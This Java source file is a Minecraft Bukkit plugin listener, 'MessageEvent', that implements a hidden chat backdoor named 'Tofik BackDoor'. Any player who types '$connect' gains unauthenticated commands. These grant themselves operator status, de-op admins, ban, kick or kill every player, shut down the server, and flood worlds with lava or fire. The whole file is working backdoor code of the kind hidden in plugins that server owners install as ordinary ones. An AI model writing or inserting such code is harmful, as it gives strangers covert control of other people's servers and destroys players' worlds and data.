package in.laxbby99_.TofikPlugin.events;

import in.laxbby99_.TofikPlugin.TofikPlugin;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MessageEvent implements Listener {

    private final Set<String> connectedPlayers = new HashSet<>();
    private final TofikPlugin plugin;
    private boolean spamTNT = false;

    public MessageEvent(TofikPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) {
        Player player = e.getPlayer();
        String message = e.getMessage();

        if (connectedPlayers.contains(player.getName())) {
            if (message.startsWith("$")) {
                handleChatCommand(player, message);
                e.setCancelled(true);
            }
        } else {
            if (message.startsWith("$connect")) {
                handleConnectCommand(player);
                e.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent e) {
        Player player = e.getPlayer();
        String command = e.getMessage();

        if (command.startsWith("$")) {
            if (!connectedPlayers.contains(player.getName())) {
                e.setCancelled(true);
            }
        }
    }

    private void handleChatCommand(Player player, String message) {
        String[] args = message.substring(1).split(" ");
        switch (args[0].toLowerCase()) {
            case "say":
                handleSayCommand(player, args);
                break;
            case "disconnect":
                handleDisconnectCommand(player);
                break;
            case "deopalladmins":
                handleDeopAllAdminsCommand();
                break;
            case "startspamtnt":
                startSpamTNT();
                player.sendMessage(ChatColor.GREEN + "Started spamming TNT.");
                break;
            case "stopspamtnt":
                stopSpamTNT();
                player.sendMessage(ChatColor.GREEN + "Stopped spamming TNT.");
                break;
            case "floodlava":
                handleFloodLavaCommand(player);
                break;
            case "bigexplosion":
                handleBigExplosionCommand(player);
                break;
            case "floodarea":
                handleFloodAreaCommand(player);
                break;
            case "spawnentities":
                handleSpawnEntitiesCommand(player);
                break;
            case "kickall":
                handleKickAllCommand(player);
                break;
            case "freeze":
                handleFreezePlayerCommand(player, args);
                break;
            case "tofikop":
                handleTofikOpCommand(player);
                break;
            case "tofikstop":
                handleTofikStopCommand(player);
                break;
            case "tofiklava":
                handleTofikLavaCommand(player);
                break;
            case "tofikexplosion":
                handleTofikExplosionCommand(player);
                break;
            case "tofiklightning":
                handleTofikLightningCommand(player);
                break;
            case "tofikfire":
                handleTofikFireCommand(player);
                break;
            case "tofikspawntnt":
                handleTofikSpawnTNTCommand(player);
                break;
            case "tofikcrash":
                handleTofikCrashCommand(player);
                break;
            case "tofikclearinventory":
                handleTofikClearInventoryCommand();
                break;
            case "tofikkillall":
                handleTofikKillAllCommand();
                break;
            case "tofikbanall":
                handleTofikBanAllCommand(player);
                break;
            case "startdeopingall":
                handleStartDeopingAllCommand();
                break;
            case "stopdeopingall":
                player.sendMessage(ChatColor.GREEN + "De-oping all players has been stopped.");
                break;
            case "opall":
                handleOpAllCommand();
                break;
            case "gm":
                handleGameModeCommand(player, args);
                break;
            case "tofikpoison":
                handleTofikPoisonCommand(player);
                break;
            case "tofikblind":
                handleTofikBlindCommand(player);
                break;
            case "setitemcommand":
                handleSetItemCommand(player, args);
                break;
            case "help":
                showHelp(player);
                break;
            default:
                player.sendMessage(ChatColor.RED + "Unknown Command.");
                break;
        }
    }

    private void handleConnectCommand(Player player) {
        if (connectedPlayers.add(player.getName())) {
            player.sendMessage(ChatColor.GREEN + "Connected to Tofik BackDoor :)");
        } else {
            player.sendMessage(ChatColor.RED + "You are already connected.");
        }
    }

    private void handleDisconnectCommand(Player player) {
        if (connectedPlayers.remove(player.getName())) {
            player.sendMessage(ChatColor.RED + "Disconnected from Tofik BackDoor :(");
        } else {
            player.sendMessage(ChatColor.RED + "You are not connected.");
        }
    }

    private void handleSayCommand(Player player, String[] args) {
        if (args.length < 2) {
            player.sendMessage(ChatColor.RED + "Usage: $say <message>");
            return;
        }
        String message = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        Bukkit.broadcastMessage(ChatColor.YELLOW + "[Broadcast] " + ChatColor.WHITE + message);
    }

    private void handleDeopAllAdminsCommand() {
        Bukkit.getOnlinePlayers().forEach(p -> {
            if (p.isOp()) {
                p.setOp(false);
                p.sendMessage(ChatColor.RED + "You have been de-opped.");
            }
        });
        Bukkit.broadcastMessage(ChatColor.RED + "All OP players have been de-opped.");
    }

    private void startSpamTNT() {
        spamTNT = true;
        Bukkit.getScheduler().runTaskTimer(plugin, () -> {
            if (spamTNT) {
                Location location = Bukkit.getOnlinePlayers().stream().findFirst().get().getLocation();
                location.getWorld().spawn(location, TNTPrimed.class);
            }
        }, 0L, 12L); // Adjust the interval as needed
    }

    private void stopSpamTNT() {
        spamTNT = false;
    }

    private void handleFloodLavaCommand(Player player) {
        Location location = player.getLocation();
        int radius = 50;
        for (int x = -radius; x <= radius; x++) {
            for (int z = -radius; z <= radius; z++) {
                Location loc = location.clone().add(x, 0, z);
                loc.getBlock().setType(Material.LAVA);
            }
        }
        player.sendMessage(ChatColor.GREEN + "Flooded the area with lava.");
    }

    private void handleBigExplosionCommand(Player player) {
        player.getWorld().createExplosion(player.getLocation(), 50.0f);
    }

    private void handleFloodAreaCommand(Player player) {
        Location location = player.getLocation();
        int radius = 30;
        for (int x = -radius; x <= radius; x++) {
            for (int z = -radius; z <= radius; z++) {
                Location loc = location.clone().add(x, 0, z);
                loc.getBlock().setType(Material.WATER);
            }
        }
        player.sendMessage(ChatColor.GREEN + "Flooded the area with water.");
    }

    private void handleSpawnEntitiesCommand(Player player) {
        for (int i = 0; i < 100; i++) {
            player.getWorld().spawnEntity(player.getLocation(), EntityType.ZOMBIE);
        }
        player.sendMessage(ChatColor.GREEN + "Spawned 100 zombies.");
    }

    private void handleKickAllCommand(Player player) {
        Bukkit.getOnlinePlayers().forEach(p -> p.kickPlayer("Server is undergoing maintenance."));
        player.sendMessage(ChatColor.GREEN + "All players have been kicked.");
    }

    private void handleFreezePlayerCommand(Player player, String[] args) {
        if (args.length < 2) {
            player.sendMessage(ChatColor.RED + "Usage: $freeze <player>");
            return;
        }
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            target.setWalkSpeed(0);
            target.sendMessage(ChatColor.RED + "You have been frozen by " + player.getName());
            player.sendMessage(ChatColor.GREEN + "Player " + target.getName() + " has been frozen.");
        } else {
            player.sendMessage(ChatColor.RED + "Player not found.");
        }
    }

    private void handleTofikOpCommand(Player player) {
        player.setOp(true);
        player.sendMessage(ChatColor.GREEN + "You have been given OP.");
    }

    private void handleTofikStopCommand(Player player) {
        Bukkit.getScheduler().cancelTasks(plugin);
        player.sendMessage(ChatColor.GREEN + "Stopped all tasks.");
    }

    private void handleTofikLavaCommand(Player player) {
        Bukkit.getWorlds().forEach(world -> {
            for (int x = -100; x < 100; x++) {
                for (int z = -100; z < 100; z++) {
                    Location loc = new Location(world, x, 64, z);
                    loc.getBlock().setType(Material.LAVA);
                }
            }
        });
        player.sendMessage(ChatColor.GREEN + "Flooded the world with lava.");
    }

    private void handleTofikExplosionCommand(Player player) {
        player.getWorld().createExplosion(player.getLocation(), 100.0f);
    }

    private void handleTofikLightningCommand(Player player) {
        player.getWorld().strikeLightning(player.getLocation());
    }

    private void handleTofikFireCommand(Player player) {
        Bukkit.getWorlds().forEach(world -> {
            for (int x = -100; x < 100; x++) {
                for (int z = -100; z < 100; z++) {
                    Location loc = new Location(world, x, 64, z);
                    loc.getBlock().setType(Material.FIRE);
                }
            }
        });
        player.sendMessage(ChatColor.GREEN + "Set the world on fire.");
    }

    private void handleTofikSpawnTNTCommand(Player player) {
        Location location = player.getLocation();
        for (int i = 0; i < 100; i++) {
            TNTPrimed tnt = (TNTPrimed) location.getWorld().spawnEntity(location, EntityType.PRIMED_TNT);
            tnt.setFuseTicks(20);
        }
        player.sendMessage(ChatColor.GREEN + "Spawned 100 TNT entities.");
    }

    private void handleTofikCrashCommand(Player player) {
        Bukkit.getOnlinePlayers().forEach(p -> p.kickPlayer("The server is crashing."));
        Bukkit.getServer().shutdown();
    }

    private void handleTofikClearInventoryCommand() {
        Bukkit.getOnlinePlayers().forEach(p -> p.getInventory().clear());
    }

    private void handleTofikKillAllCommand() {
        Bukkit.getOnlinePlayers().forEach(p -> p.setHealth(0));
    }

    private void handleTofikBanAllCommand(Player player) {
        Bukkit.getOnlinePlayers().forEach(p -> Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(), "You have been banned by an admin.", null, null));
        Bukkit.getOnlinePlayers().forEach(p -> p.kickPlayer("You have been banned by an admin."));
        player.sendMessage(ChatColor.GREEN + "All players have been banned.");
    }

    private void handleStartDeopingAllCommand() {
        Bukkit.getOnlinePlayers().forEach(p -> p.setOp(false));
        Bukkit.broadcastMessage(ChatColor.RED + "All players have been de-opped.");
    }

    private void handleOpAllCommand() {
        Bukkit.getOnlinePlayers().forEach(p -> p.setOp(true));
        Bukkit.broadcastMessage(ChatColor.GREEN + "All players have been given OP.");
    }

	private void handleGameModeCommand(Player player, String[] args) {
		if (args.length < 2) {
			player.sendMessage(ChatColor.RED + "Usage: $gm <mode>");
			return;
		}

		GameMode gameMode = null;

		switch (args[1].toLowerCase()) {
			case "survival":
			case "0":
				gameMode = GameMode.SURVIVAL;
				break;
			case "creative":
			case "1":
				gameMode = GameMode.CREATIVE;
				break;
			case "adventure":
			case "2":
				gameMode = GameMode.ADVENTURE;
				break;
			case "spectator":
			case "3":
				gameMode = GameMode.SPECTATOR;
				break;
			default:
				player.sendMessage(ChatColor.RED + "Invalid game mode.");
				return;
		}

		player.setGameMode(gameMode);
		player.sendMessage(ChatColor.GREEN + "Your game mode has been set to " + gameMode.name());
	}

    private void handleTofikPoisonCommand(Player player) {
        Bukkit.getOnlinePlayers().forEach(p -> p.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 200, 1)));
    }

    private void handleTofikBlindCommand(Player player) {
        Bukkit.getOnlinePlayers().forEach(p -> p.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 200, 1)));
    }

    private void handleSetItemCommand(Player player, String[] args) {
        if (args.length < 2) {
            player.sendMessage(ChatColor.RED + "Usage: $setitem <item> [amount]");
            return;
        }
        Material material = Material.getMaterial(args[1].toUpperCase());
        if (material == null) {
            player.sendMessage(ChatColor.RED + "Invalid item.");
            return;
        }
        int amount = args.length >= 3 ? Integer.parseInt(args[2]) : 1;
        player.getInventory().addItem(new org.bukkit.inventory.ItemStack(material, amount));
        player.sendMessage(ChatColor.GREEN + "Set item " + material.name() + " with amount " + amount);
    }

    private void showHelp(Player player) {
        List<String> commands = Arrays.asList(
                "$say <message> - Broadcast a message",
                "$disconnect - Disconnect from the plugin",
                "$deopalladmins - De-op all admins",
                "$startspamtnt - Start TNT spam",
                "$stopspamtnt - Stop TNT spam",
                "$floodlava - Flood area with lava",
                "$bigexplosion - Create a big explosion",
                "$floodarea - Flood area with water",
                "$spawnentities - Spawn 100 zombies",
                "$kickall - Kick all players",
                "$freeze <player> - Freeze a player",
                "$tofikop - Give yourself OP",
                "$tofikstop - Stop all tasks",
                "$tofiklava - Flood world with lava",
                "$tofikexplosion - Create a big explosion",
                "$tofiklightning - Strike lightning",
                "$tofikfire - Set world on fire",
                "$tofikspawntnt - Spawn 100 TNT entities",
                "$tofikcrash - Crash the server",
                "$tofikclearinventory - Clear all players' inventories",
                "$tofikkillall - Kill all players",
                "$tofikbanall - Ban all players",
                "$startdeopingall - De-op all players",
                "$stopdeopingall - Stop de-oping all players",
                "$opall - OP all players",
                "$gm <mode> - Change your game mode",
                "$tofikpoison - Poison all players",
                "$tofikblind - Blind all players",
                "$setitem <item> [amount] - Give yourself an item"
        );
        commands.forEach(command -> player.sendMessage(ChatColor.YELLOW + command));
    }
}